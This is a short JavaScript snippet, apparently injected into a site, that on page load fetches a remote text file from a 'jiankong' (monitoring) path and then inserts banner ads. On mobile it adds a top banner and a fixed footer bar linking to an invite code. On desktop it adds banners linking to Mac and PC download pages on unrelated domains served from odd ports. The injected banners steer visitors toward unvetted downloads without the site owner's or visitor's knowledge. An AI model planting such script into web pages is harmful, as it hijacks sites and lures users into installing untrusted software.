$(function () {
    var url;
    $.get("https://manyjs.com/jiankong/sg.txt", function (result) {
        url = result;
        console.log(url)

        if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent) || /(Android)/i.test(navigator.userAgent)) {
            $('body').before(' <div style="text-align:center;position:relative;z-index:999;"><a href="http://wxzaa.duokuaijiasu.top:5657/invite?code=949op2Iv"><img src="http://img.dkjsq.cloud:6699/dkzq/dkm.jpg" style="width:100%" /></a></div>');
            var img = '<div class="footer-gg" style="width:100%;position:fixed;left:0px;bottom:2px;z-index:9999999;height:50px;background-image:url(http://img.dkjsq.cloud:6699/dkzq/dkm2.jpg);background-size:100%;"><span class="closex" style="display:block;float:right;font-size:12px;cursor:pointer;color:#FFF;">鍏抽棴</span><a href="http://wxzaa.duokuaijiasu.top:5657/invite?code=949op2Iv" style="display:line-block;width:25%;height:100%;position:absolute;right:35%;"></a><a href="http://wxzaa.duokuaijiasu.top:5657/invite?code=949op2Iv" style="display:line-block;width:25%;height:100%;position:absolute;right:8%;"></a></div>'
            $('body').append(img);
            javascript:;
            $(document).on('click', '.closex', function () {
                $('.footer-gg').hide();
            })

        } else {
            $('body').before(' <div style="text-align:center;position:relative;z-index:999;width: 100%;overflow: hidden;"><a href="http://down.duokuai.club:5657/mac.html"><img src="http://img.dkjsq.cloud:6699/dkzq/pcm2.jpg" style="width:100%" /></a><a href="http://down.duokuai.club:5657/pc.html"><img src="http://img.dkjsq.cloud:6699/dkzq/dkpc.jpg" style="width:100.9%;margin-top:-5px;" /></a></div>');
        }
    });
})

